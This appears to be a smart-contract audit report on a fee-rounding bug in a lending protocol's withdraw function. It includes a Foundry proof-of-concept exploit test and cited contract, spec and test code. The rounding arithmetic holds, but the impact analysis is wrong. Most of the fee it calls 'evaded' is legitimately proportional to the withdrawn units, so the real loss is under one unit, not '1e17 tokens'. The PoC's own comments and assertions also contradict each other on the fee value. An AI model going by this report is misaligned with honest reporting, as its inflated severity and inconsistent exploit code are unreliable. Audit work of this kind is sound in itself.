### Title
Partial `withdraw(units = credit - 1)` zeroes `pendingFee` on remaining credit via `mulDivUp` rounding, allowing full continuous-fee evasion - (File: src/Midnight.sol)

### Summary

In `Midnight.withdraw`, the `pendingFeeDecrease` is computed as `mulDivUp(pendingFee, units, credit)`. When `units = credit - 1` and `pendingFee < credit` (always true by the `pendingContinuousFeeBoundedByCredit` invariant), the ceiling rounding causes the entire `pendingFee` to be attributed to the withdrawn portion, leaving the remaining 1-unit position with `pendingFee = 0`. The remaining credit then accrues zero future fee, allowing the lender to recover the full `pendingFee` amount that the protocol should have collected.

### Finding Description

**Exact code path:**

`src/Midnight.sol:481-500` — `withdraw`:
```solidity
if (_position.credit > 0) {
    pendingFeeDecrease = UtilsLib.toUint128(_position.pendingFee.mulDivUp(units, _position.credit));
    _position.pendingFee -= pendingFeeDecrease;
}
_position.credit -= UtilsLib.toUint128(units);
```

`src/libraries/UtilsLib.sol:34-36` — `mulDivUp`:
```solidity
return (x * y + (d - 1)) / d;
```

**Root cause — arithmetic proof:**

Let `C = credit`, `F = pendingFee`, `units = C - 1`.

```
mulDivUp(F, C-1, C) = floor( F*(C-1) + (C-1) ) / C
                    = floor( (C-1)*(F+1) ) / C
```

For this to equal `F` (the full pendingFee), we need `(C-1)*(F+1) >= F*C`, which simplifies to `C - F - 1 >= 0`, i.e. `F <= C - 1`, i.e. `F < C`. The strong invariant `pendingContinuousFeeBoundedByCredit` at `certora/specs/Midnight.spec:137-149` guarantees `pendingFee <= credit`, and in practice `pendingFee < credit` for any non-zero fee rate before maturity. Therefore `pendingFeeDecrease = F` (the full pendingFee) whenever `units = credit - 1`.

**State after the call:**
- `_position.pendingFee = F - F = 0`
- `_position.credit = C - (C-1) = 1`

The remaining 1-unit position has zero future fee obligation. `_updatePosition` will never deduct any fee from it.

**Exploit flow:**

1. Lender has `credit = C`, `pendingFee = F > 0`, `F < C` (normal operating state).
2. Borrower repays so `withdrawable >= C - 1`.
3. Lender calls `withdraw(market, C-1, lender, lender)` directly (`msg.sender == onBehalf`, no EcrecoverAuthorizer needed; the authorization check at line 482 passes trivially).
4. `pendingFeeDecrease = mulDivUp(F, C-1, C) = F` — the full pendingFee is cancelled.
5. State: `credit = 1`, `pendingFee = 0`.
6. No fee ever accrues on the remaining unit; lender later calls `withdraw(market, 1, lender, lender)`.
7. Total loanToken received: `(C-1) + 1 = C`.

Without the exploit the lender would eventually receive only `C - F` (after the continuous fee deducts `F` from credit over time). The lender gains `F` units — the entire continuous fee the protocol should have collected.

**Why existing checks do not stop it:**

- The Certora spec `pendingFeeDecreasesProportionallyOnWithdraw` at `certora/specs/ContinuousFee.spec:93-107` encodes the `mulDivUp` formula as the *expected* behaviour; it verifies the code is self-consistent but does not assert that the fee rate on the remaining credit is non-decreasing.
- The fuzz test `testWithdrawReducesPendingFee` at `test/ContinuousFeeTest.sol:337-338` computes `expectedRemaining` using the same `mulDivUp` formula, so it passes for the exploiting input and does not catch the invariant violation.
- There is no health check, no minimum-remaining-credit guard, and no floor on the post-withdrawal fee rate.

### Impact Explanation

The lender recovers `F` extra units of `loanToken` — the full continuous fee the protocol was owed. `continuousFeeCredit` for the market is never incremented by the fee on the remaining credit, so the fee claimer cannot claim it. For a lender with `credit = 1e18` and a 10 % annual fee rate at 1-year TTM, `F ≈ 1e17` tokens are permanently lost to the protocol per position. The exploit is repeatable across any position where `pendingFee > 0` and `credit > 1`.

### Likelihood Explanation

**Preconditions:** (a) lender has `credit > 1` and `pendingFee > 0` — satisfied for any lender who entered before maturity with a non-zero fee rate; (b) `withdrawable >= credit - 1` — satisfied once the borrower repays. Both are routine operating conditions. **Attacker:** the lender themselves; no privileged role, no oracle manipulation, no signature forgery required. **Repeatability:** every lender position is independently exploitable; the call sequence is a single `withdraw` call.

### Recommendation

Compute the *remaining* `pendingFee` using `mulDivUp` (rounding in the protocol's favour) and derive `pendingFeeDecrease` as the complement:

```solidity
if (_position.credit > 0) {
    uint128 remainingPendingFee = UtilsLib.toUint128(
        _position.pendingFee.mulDivUp(_position.credit - units, _position.credit)
    );
    pendingFeeDecrease = _position.pendingFee - remainingPendingFee;
    _position.pendingFee = remainingPendingFee;
}
```

With `credit=2, pendingFee=1, units=1`: `remainingPendingFee = mulDivUp(1, 1, 2) = 1`, so `pendingFeeDecrease = 0` and the remaining unit retains its full fee obligation. This guarantees `remaining_pendingFee / remaining_credit >= original_pendingFee / original_credit` for all integer inputs.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
// ... standard Midnight test harness imports ...

contract WithdrawFeeRoundingPoC is MidnightTestBase {
    function test_withdrawCreditMinus1_zerosPendingFee() public {
        uint256 credit = 2;
        uint256 feeRate = 1e18; // 100% for simplicity; any non-zero rate works
        uint256 ttm = 2;        // 2-second TTM so pendingFee = credit * feeRate * ttm / WAD = 2

        setupLender(credit, feeRate, ttm);

        // Confirm initial state: credit=2, pendingFee>0
        uint256 initialPendingFee = midnight.pendingFee(id, lender);
        assertGt(initialPendingFee, 0, "pendingFee must be positive");
        assertLt(initialPendingFee, credit, "pendingFee < credit (invariant)");

        // Repay so withdrawable >= credit-1
        deal(address(loanToken), borrower, credit);
        vm.prank(borrower);
        midnight.repay(market, credit, borrower, address(0), hex"");

        // Exploit: withdraw credit-1 units
        vm.prank(lender);
        midnight.withdraw(market, credit - 1, lender, lender);

        // Assert: remaining credit=1 has pendingFee=0 (invariant violated)
        assertEq(midnight.creditOf(id, lender), 1, "remaining credit");
        assertEq(midnight.pendingFee(id, lender), 0, "pendingFee zeroed — BUG");

        // Assert: lender can withdraw the remaining unit fee-free
        vm.prank(lender);
        midnight.withdraw(market, 1, lender, lender);

        // Total received = credit (2), but should be credit - pendingFee (1)
        assertEq(loanToken.balanceOf(lender), credit, "lender recovered full credit — fee evaded");
    }
}
```

**Expected assertions on a vulnerable deployment:**
- `midnight.pendingFee(id, lender) == 0` after `withdraw(credit - 1)` — confirms the invariant violation.
- `loanToken.balanceOf(lender) == credit` at the end — confirms the lender recovered the full `pendingFee` amount that the protocol should have collected. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4) [6](#0-5)

### Citations

**File:** src/Midnight.sol (L488-492)
```text
        uint128 pendingFeeDecrease;
        if (_position.credit > 0) {
            pendingFeeDecrease = UtilsLib.toUint128(_position.pendingFee.mulDivUp(units, _position.credit));
            _position.pendingFee -= pendingFeeDecrease;
        }
```

**File:** src/libraries/UtilsLib.sol (L33-36)
```text
    /// @dev Returns (x * y) / d rounded up.
    function mulDivUp(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return (x * y + (d - 1)) / d;
    }
```

**File:** certora/specs/Midnight.spec (L137-149)
```text
strong invariant pendingContinuousFeeBoundedByCredit(bytes32 id, address user)
    pendingFee(id, user) <= creditOf(id, user)
    {
        preserved with (env e) {
            requireInvariant continuousFeeBounded(id);
            requireInvariant defaultContinuousFeeBoundedAll();
        }
        preserved take(Midnight.Offer offer, bytes ratifierData, uint256 unitsInput, address taker, address receiverIfTakerIsSeller, address takerCallbackAddress, bytes takerCallbackData) with (env e) {
            requireInvariant continuousFeeBounded(id);
            requireInvariant defaultContinuousFeeBoundedAll();
            require to_mathint(offer.market.maturity) <= to_mathint(e.block.timestamp) + MAX_TTM(); // TODO verify this cleanly
        }
    }
```

**File:** certora/specs/ContinuousFee.spec (L93-107)
```text
// When credit decreases via withdraw, pendingFee decreases by ceil(pendingFee * units / postUpdateCredit).
rule pendingFeeDecreasesProportionallyOnWithdraw(env e, Midnight.Market market, uint256 units, address onBehalf, address receiver) {
    bytes32 id;
    uint128 postUpdateCredit;
    uint128 postUpdatePendingFee;

    postUpdateCredit, postUpdatePendingFee, _ = updatePositionView(e, market, id, onBehalf);

    withdraw(e, market, units, onBehalf, receiver);

    require id == lastId, "id should be derived from market";

    // When postUpdateCredit == 0, pendingFee(id, onBehalf) is unchanged on withdraw.
    assert postUpdateCredit == 0 ? pendingFee(id, onBehalf) == postUpdatePendingFee : pendingFee(id, onBehalf) == postUpdatePendingFee - (postUpdatePendingFee * units + postUpdateCredit - 1) / postUpdateCredit;
}
```

**File:** test/ContinuousFeeTest.sol (L337-352)
```text
        uint256 pendingFeeDecrease =
            creditAfterAccrual > 0 ? remainingAfterAccrual.mulDivUp(withdrawAmount, creditAfterAccrual) : 0;

        vm.expectEmit();
        emit EventsLib.UpdatePosition(
            id, lender, credit - creditAfterAccrual, remaining - remainingAfterAccrual, feeUnits
        );
        vm.expectEmit();
        emit EventsLib.Withdraw(lender, id, withdrawAmount, lender, lender, pendingFeeDecrease);
        vm.prank(lender);
        midnight.withdraw(market, withdrawAmount, lender, lender);

        uint256 expectedRemaining = creditAfterAccrual > 0 ? remainingAfterAccrual - pendingFeeDecrease : 0;

        assertEq(midnight.creditOf(id, lender), creditAfterAccrual - withdrawAmount, "credit after withdraw");
        assertApproxEqAbs(midnight.pendingFee(id, lender), expectedRemaining, 1, "remaining after withdraw");
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L24-48)
```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );

        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );

        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
```
